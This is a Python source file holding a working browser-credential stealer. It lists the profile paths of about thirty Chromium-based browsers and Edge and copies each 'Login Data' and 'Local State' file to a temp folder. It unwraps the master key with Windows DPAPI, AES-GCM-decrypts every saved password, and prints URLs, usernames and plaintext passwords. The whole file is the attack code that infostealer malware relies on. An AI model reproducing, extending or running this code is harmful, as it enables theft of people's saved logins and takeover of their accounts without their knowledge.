import sqlite3
import re
import os
from base64 import b64decode
from win32crypt import CryptUnprotectData
from shutil import copyfile
from Cryptodome.Cipher import AES

class ChromiumEdge(object):

    chromiumpswpaths = ["\\Chromium\\User Data\\", "\\Google\\Chrome\\User Data\\", "\\Google\\Chrome Beta\\User Data\\", "\\Google(x86)\\Chrome\\User Data\\", "\\Google(x86)\\Chrome Beta\\User Data\\", "\\Opera Software\\", "\\MapleStudio\\ChromePlus\\User Data\\", "\\Iridium\\User Data\\", "7Star\\7Star\\User Data", "CentBrowser\\User Data", "Chedot\\User Data", "Vivaldi\\User Data", "Kometa\\User Data", "Elements Browser\\User Data", "Epic Privacy Browser\\User Data", "uCozMedia\\Uran\\User Data", "Fenrir Inc\\Sleipnir5\\setting\\modules\\ChromiumViewer", "CatalinaGroup\\Citrio\\User Data", "Coowon\\Coowon\\User Data", "liebao\\User Data", "QIP Surf\\User Data", "Orbitum\\User Data", "Comodo\\Dragon\\User Data", "Amigo\\User\\User Data", "Torch\\User Data", "Yandex\\YandexBrowser\\User Data", "Comodo\\User Data", "360Browser\\Browser\\User Data", "\\Tencent\\QQBrowser\\User Data\\", "Maxthon3\\User Data", "K-Melon\\User Data", "CocCoc\\Browser\\User Data", "BraveSoftware\\Brave-Browser\\User Data"]
    edgepswpaths = ["Microsoft\\Edge\\User Data"]

    tempdir = "C:\\temp\\ChromiumEdge\\"

    appdata = os.environ["appdata"] + "\\"
    localappdata = os.environ["localappdata"] + "\\"
    
    passwdlist = []

    def GetMasterKey(self, localstate) -> None:
        if not os.path.exists(localstate):
            return None
        with open(localstate, 'rb') as f:
            res = re.search(b'''"encrypted_key"\:"([a-zA-Z0-9\+/=]+)"},''', f.read()).groups()[0]
            temp = b64decode(res)[5:]
            return CryptUnprotectData(temp, None, None, None, 0)[1]
    
    def DecryptWithMasterKey(self, passwd) -> bytes:
        aes = AES.new(self.masterkey, mode=AES.MODE_GCM, nonce = passwd[3:15])
        temp = aes.decrypt(passwd[15:])
        return temp[:-16] if len(temp) > 16 else temp

    def DecryptPassword(self, passwd) -> bytes:
        if passwd.startswith(b"v10") or passwd.startswith(b"v11"):
            return self.DecryptWithMasterKey(passwd)
        else:
            return CryptUnprotectData(passwd, None, None, None, 0)[1]

    def Decrypt(self, logindata, localstate) -> None:
        self.masterkey = self.GetMasterKey(localstate)
        
        with sqlite3.connect(logindata) as conn:
            concur = conn.cursor()
            res = concur.execute("SELECT origin_url, username_value, password_value FROM logins").fetchall()
            for x in res:
                tmp = dict()
                tmp['url'] = x[0]
                tmp['username'] = x[1]
                tmp['password'] = self.DecryptPassword(x[2])
                self.passwdlist.append(tmp)
        self.masterkey = None

    def FormatOutput(self) -> None:
        print(" \n\n====== ChromiumEdge password list : \n")
        for x in self.passwdlist:
            print(x)
        
    def Run(self) -> None:
        if not os.path.exists(self.tempdir):
            os.makedirs(self.tempdir)
        for p in self.chromiumpswpaths + self.edgepswpaths:
            if "opera software" in p.lower():
                userdatapath = self.appdata + p
            else:
                userdatapath = self.localappdata + p
            if not os.path.exists(userdatapath):
                continue
            for usr in os.listdir(userdatapath):
                logindata = userdatapath + "\\" + usr + "\\login data"
                if os.path.exists(logindata):
                    try:
                        templogindata = self.tempdir + "\\login data"
                        templocalstate = self.tempdir + "\\local state"
                        copyfile(logindata, templogindata)
                        copyfile(os.path.dirname(os.path.dirname(logindata)) + "\\local state", templocalstate)
                        self.Decrypt(templogindata, templocalstate)
                    except: pass
        self.FormatOutput()
